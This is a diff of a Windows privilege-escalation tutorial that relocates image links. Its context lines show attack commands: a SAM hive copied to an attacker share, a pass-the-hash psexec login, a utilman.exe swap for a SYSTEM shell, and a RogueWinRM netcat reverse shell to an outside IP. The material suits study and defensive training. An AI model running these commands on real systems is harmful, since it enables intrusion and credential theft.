@@ -182,7 +182,7 @@ C:\> sc.exe config <service_name> binPath= "path_to_your_evilexe_file" obj= Loca
 
 If a user has **SeBackup/SeRestore**  priviledge granted then this means the user is allowed to read and write to any file in the system, The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
 
-![image](whoami_priv.png)
+![image](images/whoami_priv.png)
 
 ### Abusing
 
@@ -203,7 +203,7 @@ PS C:\tools> copy .\sam.hive \\192.168.205.012\public
 
 Dumping
 
-![image](secretdump.png) 
+![image](images/secretdump.png) 
 
 Performing Pass-the-Hash attack.
 
@@ -211,7 +211,7 @@ Performing Pass-the-Hash attack.
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.49.154.42
 ```
 
-![image](passthehashpsexec.png)
+![image](images/passthehashpsexec.png)
 
 ## Abusing SeTakeOwnership Privileges
 
@@ -223,7 +223,7 @@ We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in 
 
 Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file.
 
-![image](setakeown_whoami_priv.png)
+![image](images/setakeown_whoami_priv.png)
 
 ### Abusing
 
@@ -257,7 +257,7 @@ Overwrite Utilman.exe? (Yes/No/All): Yes
 To trigger utilman, we will lock our screen from the start button:
 And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
 
-![image](setakeown_final.png)
+![image](images/setakeown_final.png)
 
 ## Abusing SeImpersonate Privileges
 
@@ -275,13 +275,13 @@ If the FTP service were compromised at some point, the attacker would immediatel
 
 By using the tokens for loggin in users.
 
-![image](ftp_1.png)
+![image](images/ftp_1.png)
 
-![image](seimpor_whoami_priv.png)
+![image](images/seimpor_whoami_priv.png)
 
 ```
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 192.168.205.012 4554"
 ```
 The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
 
-![image](seimpor_successfull_rev.png)
+![image](images/seimpor_successfull_rev.png)
